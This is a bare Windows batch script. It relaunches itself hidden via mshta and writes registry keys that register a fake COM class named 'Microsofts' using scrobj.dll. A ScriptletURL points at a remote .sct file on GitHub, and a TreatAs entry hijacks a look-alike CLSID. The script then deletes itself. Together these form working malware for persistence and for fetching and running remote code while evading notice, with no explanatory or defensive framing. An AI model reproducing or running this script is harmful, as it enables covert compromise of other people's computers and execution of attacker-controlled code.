

%1 start mshta vbscript:createobject("wscript.shell").run("""%~0"" ::",0)(window.close) 


SET KEY1=HKEY_CURRENT_USER\SOFTWARE\Classes
SET KEY2=HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{3734FF83-6764-44B7-A1B9-55F57183CDB0}
SET KEY3=HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{3734FF83-6764-44B7-A1B9-55F56183CDB0}


REG.EXE ADD %KEY1%\Microsofts.1.00 /VE /T REG_SZ /D "Microsofts" /F
REG.EXE ADD %KEY1%\Microsofts.1.00\CLSID /VE /T REG_SZ /D "{3734FF83-6764-44B7-A1B9-55F57183CDB0}" /F

REG.EXE ADD %KEY1%\Microsofts /VE /T REG_SZ /D "Microsofts" /F
REG.EXE ADD %KEY1%\Microsofts\CLSID /VE /T REG_SZ /D "{3734FF83-6764-44B7-A1B9-55F57183CDB0}" /F

REG.EXE ADD %KEY2% /VE /T REG_SZ /D "Microsofts" /F
REG.EXE ADD %KEY2%\InprocServer32 /VE /T REG_SZ /D "C:\\WINDOWS\\system32\\scrobj.dll" /F
REG.EXE ADD %KEY2%\InprocServer32 /V ThreadingModel /T REG_SZ /D Apartment /F 

REG.EXE ADD %KEY2%\ProgID /VE /T REG_SZ /D "Microsofts.1.00" /F
REG.EXE ADD %KEY2%\ScriptletURL /VE /T REG_SZ /D "https://raw.githubusercontent.com/KJHIUHddwe/ooodieoo/master/ccccccc.sct" /F

REG.EXE ADD %KEY2%\VersionIndependentProgID /VE /T REG_SZ /D "Microsofts" /F

REG.EXE ADD %KEY3%\TreatAs /VE /T REG_SZ /D "{3734FF83-6764-44B7-A1B9-55F57183CDB0}" /F


ping -n 3 127.0.0.1>nul
del %0

